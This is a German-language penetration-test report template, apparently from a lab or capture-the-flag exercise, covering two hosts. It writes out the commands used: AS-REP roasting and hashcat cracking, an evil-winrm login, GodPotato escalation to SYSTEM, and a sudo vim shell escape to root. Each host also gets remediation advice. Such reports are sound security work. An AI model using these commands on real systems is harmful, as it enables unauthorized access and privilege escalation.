# Pentest Report — [Target Name]

**Tester:** [Dein Name]
**Datum:** YYYY-MM-DD
**Scope:** 10.10.10.0/24

---

## Executive Summary

Im Rahmen des Pentests wurden zwei Maschinen erfolgreich kompromittiert. Auf beiden Systemen konnten administrative Privilegien erlangt werden.

| Target | OS | Initial Access | Privilege Escalation | Root erlangt? |
|---|---|---|---|---|
| 10.10.10.10 | Windows Server 2019 | AS-REP Roasting | SeImpersonate → GodPotato | ✅ |
| 10.10.10.20 | Ubuntu 20.04 | SQLi → RCE | sudo NOPASSWD vim | ✅ |

---

## Target 1: 10.10.10.10 (Windows)

### Recon

```
nmap -sS -sV -sC -p- 10.10.10.10
```

Offene Ports:
- 53, 88, 389, 445, 5985 → **Domain Controller**

### Vulnerability: AS-REP Roasting

**Beschreibung:** Account `user1` ist mit "Do not require Kerberos preauthentication" konfiguriert.

**Reproduktion:**
```bash
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat
hashcat -m 18200 hash.txt rockyou.txt
# → Winter2024!
```

**Screenshot:** [screenshots/asrep.png]

### Privilege Escalation: SeImpersonatePrivilege

```bash
evil-winrm -i 10.10.10.10 -u user1 -p 'Winter2024!'
PS> whoami /priv
# SeImpersonatePrivilege Enabled
PS> upload GodPotato.exe
PS> .\GodPotato.exe -cmd "cmd /c whoami"
# nt authority\system
```

### Proof

```
PS C:\Users\Administrator\Desktop> type root.txt
flag{...}
```

### Empfehlungen
- "Do not require Kerberos preauth" deaktivieren
- Komplexere Passwörter erzwingen
- SeImpersonatePrivilege auf Service-Accounts beschränken

---

## Target 2: 10.10.10.20 (Linux)

### Recon

[...]

### Vulnerability: SQL Injection

[...]

### Privilege Escalation: Sudo Misconfiguration

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
# id → uid=0(root)
```

### Empfehlungen
- Input-Validation in Login-Form
- Sudo-Regeln auf konkrete Befehle einschränken

---

## Anhang

- nmap-Outputs: [nmap/]
- Tools verwendet: nmap, impacket-suite, evil-winrm, hashcat, sqlmap
